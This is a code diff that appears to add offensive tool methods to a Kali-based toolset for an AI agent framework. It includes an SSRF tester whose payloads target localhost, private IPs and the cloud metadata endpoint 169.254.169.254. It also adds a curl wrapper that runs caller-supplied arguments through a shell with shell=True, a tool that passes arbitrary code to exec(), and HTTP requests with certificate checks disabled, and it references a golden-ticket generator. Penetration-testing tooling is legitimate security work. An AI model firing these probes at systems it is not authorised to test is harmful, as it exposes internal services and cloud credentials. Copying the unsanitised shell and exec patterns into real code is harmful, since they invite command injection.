@@ -1,7 +1,9 @@
 import os
 import subprocess
 import tempfile
+import time
 
+import requests
 from loguru import logger
 
 from dreadnode.agent.tools import Toolset, tool_method
@@ -913,6 +915,306 @@ class KaliTool(Toolset):
 
         command_log = "Commands executed:\n" + "\n".join(f"  {cmd}" for cmd in executed_commands)
         return command_log + "\n\nResults:\n" + "\n".join(results)
+
+    @tool_method()
+    def test_ssrf_vulnerability(
+        self,
+        url: str,
+        parameter: str,
+        original_value: str = "",
+    ) -> str:
+        """
+        Test a URL parameter for SSRF vulnerability by trying various payloads.
+
+        Args:
+            url: Target URL containing the vulnerable parameter
+            parameter: Parameter name to test
+            original_value: Original parameter value for comparison
+
+        Returns:
+            SSRF test results comparing different payloads
+
+        Example:
+            >>> result = test_ssrf_vulnerability("https://target.com/api?data=value", "data", "original")
+        """
+
+        results = []
+        executed_commands = []
+
+        # Test payloads for SSRF
+        payloads = [
+            ("localhost", "http://127.0.0.1"),
+            ("internal-ip", "http://192.168.1.1"),
+            ("cloud-metadata", "http://169.254.169.254/latest/meta-data/"),
+            ("external-control", "http://httpbin.org/get"),
+        ]
+
+        # Test original request first if we have original value
+        if original_value:
+            try:
+                if '?' in url:
+                    test_url = f"{url}&{parameter}={original_value}"
+                else:
+                    test_url = f"{url}?{parameter}={original_value}"
+                
+                curl_cmd = f"curl -s -w '%{{http_code}}|%{{time_total}}' --max-time 10 '{test_url}'"
+                executed_commands.append(curl_cmd)
+                
+                import requests
+                response = requests.get(test_url, timeout=10, allow_redirects=False)
+                results.append(f"Original request: HTTP {response.status_code}, Length: {len(response.text)}")
+                
+            except Exception as e:
+                results.append(f"Original request failed: {e}")
+
+        # Test SSRF payloads
+        for payload_name, payload_value in payloads:
+            try:
+                # URL encode the payload
+                import urllib.parse
+                encoded_payload = urllib.parse.quote(payload_value, safe='')
+                
+                if '?' in url:
+                    test_url = f"{url}&{parameter}={encoded_payload}"
+                else:
+                    test_url = f"{url}?{parameter}={encoded_payload}"
+
+                curl_cmd = f"curl -s -w '%{{http_code}}|%{{time_total}}' --max-time 10 '{test_url}'"
+                executed_commands.append(curl_cmd)
+
+                import requests
+                import time
+                start_time = time.time()
+                response = requests.get(test_url, timeout=10, allow_redirects=False)
+                response_time = time.time() - start_time
+
+                # Check for SSRF indicators
+                indicators = []
+                if response.status_code != 200:
+                    indicators.append(f"status_{response.status_code}")
+                if response_time > 5:
+                    indicators.append("slow_response")
+                if any(keyword in response.text.lower() for keyword in ['connection refused', 'timeout', 'internal']):
+                    indicators.append("error_messages")
+                if len(response.text) < 100:
+                    indicators.append("short_response")
+
+                indicator_str = f" [{', '.join(indicators)}]" if indicators else ""
+                results.append(f"{payload_name}: HTTP {response.status_code}, Time: {response_time:.2f}s, Length: {len(response.text)}{indicator_str}")
+
+            except requests.exceptions.Timeout:
+                results.append(f"{payload_name}: TIMEOUT (potential SSRF indicator)")
+            except requests.exceptions.ConnectionError as e:
+                results.append(f"{payload_name}: CONNECTION_ERROR - {str(e)[:100]}")
+            except Exception as e:
+                results.append(f"{payload_name}: ERROR - {str(e)[:100]}")
+
+        logger.info(f"[*] SSRF vulnerability test completed for {url}")
+
+        command_log = "Commands executed:\n" + "\n".join(f"  {cmd}" for cmd in executed_commands)
+        return command_log + "\n\nResults:\n" + "\n".join(results)
+
+    @tool_method()
+    def http_request(
+        self,
+        url: str,
+        method: str = "GET",
+        headers: dict[str, str] | None = None,
+        timeout: int = 10,
+        follow_redirects: bool = False,
+        max_response_size: int = 5000,
+    ) -> str:
+        """
+        Make an HTTP request and return detailed response information.
+
+        Args:
+            url: Target URL to request
+            method: HTTP method (GET, POST, PUT, etc.)
+            headers: Optional HTTP headers to send
+            timeout: Request timeout in seconds
+            follow_redirects: Whether to follow HTTP redirects
+            max_response_size: Maximum response size to capture (chars)
+
+        Returns:
+            Detailed HTTP response information including status, headers, timing, and content
+
+        Example:
+            >>> result = http_request("https://httpbin.org/get")
+            >>> result = http_request("https://target.com/api?param=http://127.0.0.1", timeout=5)
+        """
+
+        results = []
+        executed_commands = []
+
+        try:
+            curl_cmd_parts = ["curl", "-s", "-v", "--max-time", str(timeout)]
+            if method != "GET":
+                curl_cmd_parts.extend(["-X", method])
+            if follow_redirects:
+                curl_cmd_parts.append("--location-trusted")
+            if headers:
+                for key, value in headers.items():
+                    curl_cmd_parts.extend(["-H", f"{key}: {value}"])
+            curl_cmd_parts.append(f"'{url}'")
+            
+            curl_cmd = " ".join(curl_cmd_parts)
+            executed_commands.append(curl_cmd)
+
+            
+            start_time = time.time()
+            
+            response = requests.request(
+                method=method,
+                url=url,
+                headers=headers or {},
+                timeout=timeout,
+                allow_redirects=follow_redirects,
+                verify=False,  # Allow self-signed certs for testing
+            )
+            
+            response_time = time.time() - start_time
+
+            # Capture response details
+            results.append(f"HTTP/{response.raw.version // 10}.{response.raw.version % 10} {response.status_code} {response.reason}")
+            results.append(f"Response time: {response_time:.3f}s")
+            results.append(f"Content length: {len(response.content)} bytes")
+            results.append(f"Content type: {response.headers.get('content-type', 'unknown')}")
+            
+            # Capture important response headers
+            important_headers = ['server', 'location', 'set-cookie', 'x-powered-by', 'x-frame-options']
+            for header in important_headers:
+                if header in response.headers:
+                    results.append(f"{header.title()}: {response.headers[header]}")
+
+            # Capture response body (truncated if too large)
+            if response.content:
+                try:
+                    response_text = response.text
+                    if len(response_text) > max_response_size:
+                        preview = response_text[:max_response_size] + "... [TRUNCATED]"
+                    else:
+                        preview = response_text
+                    
+                    # Clean up response for analysis
+                    preview = preview.replace('\n', '\\n').replace('\r', '\\r')
+                    results.append(f"Response body: {preview}")
+                except:
+                    results.append("Response body: [BINARY DATA]")
+            else:
+                results.append("Response body: [EMPTY]")
+
+            # Add analysis hints
+            analysis_hints = []
+            if response_time > 5:
+                analysis_hints.append("SLOW_RESPONSE")
+            if response.status_code >= 500:
+                analysis_hints.append("SERVER_ERROR")
+            if response.status_code == 403:
+                analysis_hints.append("FORBIDDEN")
+            if response.status_code in [301, 302, 307, 308]:
+                analysis_hints.append("REDIRECT")
+            if len(response.content) == 0:
+                analysis_hints.append("EMPTY_RESPONSE")
+            if any(keyword in response.text.lower() for keyword in ['connection', 'timeout', 'refused', 'internal']):
+                analysis_hints.append("CONNECTION_KEYWORDS")
+            
+            if analysis_hints:
+                results.append(f"Analysis hints: {', '.join(analysis_hints)}")
+
+        except requests.exceptions.Timeout:
+            results.append(f"Request timed out after {timeout}s")
+            results.append("Analysis hints: TIMEOUT")
+        except requests.exceptions.ConnectionError as e:
+            error_msg = str(e)[:200]
+            results.append(f"Connection error: {error_msg}")
+            results.append("Analysis hints: CONNECTION_ERROR")
+        except Exception as e:
+            error_msg = str(e)[:200]
+            results.append(f"Request failed: {error_msg}")
+            results.append("Analysis hints: REQUEST_FAILED")
+
+        logger.info(f"[*] HTTP request completed for {url}")
+
+        command_log = "Commands executed:\n" + "\n".join(f"  {cmd}" for cmd in executed_commands)
+        return command_log + "\n\nResults:\n" + "\n".join(results)
+
+    @tool_method()
+    def curl(self, args: str) -> str:
+        """
+        Execute curl command with specified arguments.
+        
+        Args:
+            args: Complete curl arguments (e.g., "-s -I https://example.com" or "-X POST -d 'data' https://api.example.com")
+            
+        Returns:
+            Raw curl output
+        """
+        try:
+            result = subprocess.run(
+                f"curl {args}",
+                shell=True,
+                capture_output=True,
+                text=True,
+                timeout=30
+            )
+            
+            output = []
+            if result.stdout:
+                output.append("STDOUT:")
+                output.append(result.stdout)
+            if result.stderr:
+                output.append("STDERR:")
+                output.append(result.stderr)
+            output.append(f"Exit code: {result.returncode}")
+            
+            return "\n".join(output)
+            
+        except subprocess.TimeoutExpired:
+            return "Error: Command timed out after 30 seconds"
+        except Exception as e:
+            return f"Error executing curl: {e}"
+
+    @tool_method() 
+    def python_requests(self, code: str) -> str:
+        """
+        Execute Python requests library code for HTTP operations.
+        
+        Args:
+            code: Python code using requests library (imports handled automatically)
+            
+        Returns:
+            Output from executed Python code
+            
+        Example:
+            code = "r = requests.get('https://httpbin.org/get'); print(f'Status: {r.status_code}'); print(r.text[:200])"
+        """
+        try:
+            # Create safe execution environment with requests available
+            import sys
+            from io import StringIO
+            
+            # Capture output
+            old_stdout = sys.stdout
+            sys.stdout = captured_output = StringIO()
+            
+            # Execute the code with requests imported
+            exec_globals = {
+                'requests': requests,
+                'json': __import__('json'),
+                'time': time,
+            }
+            
+            exec(code, exec_globals)
+            
+            # Restore stdout and get output
+            sys.stdout = old_stdout
+            output = captured_output.getvalue()
+            
+            return output if output else "Code executed successfully (no output)"
+            
+        except Exception as e:
+            sys.stdout = old_stdout
+            return f"Error executing code: {e}"
 
     @tool_method()
     def generate_golden_ticket(
